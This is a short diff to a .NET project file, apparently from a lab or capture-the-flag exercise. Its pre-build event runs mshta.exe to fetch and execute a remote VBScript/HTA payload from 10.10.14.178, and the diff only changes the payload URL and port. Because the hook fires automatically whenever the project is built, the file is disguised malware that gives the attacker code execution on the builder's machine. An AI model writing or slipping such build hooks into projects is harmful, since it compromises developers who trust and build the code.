@@ -6,7 +6,7 @@
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
     <PreBuildEvent>
-      <Command> mshta.exe vbscript:Close(Execute("GetObject(""script:http://10.10.14.178:4545/payload.sct"")")) </Command>
+      <Command> mshta.exe vbscript:Close(Execute("GetObject(""script:http://10.10.14.178:8080/viKLvaC0WXZUs.hta"")")) </Command>
     </PreBuildEvent>
   </PropertyGroup>
 
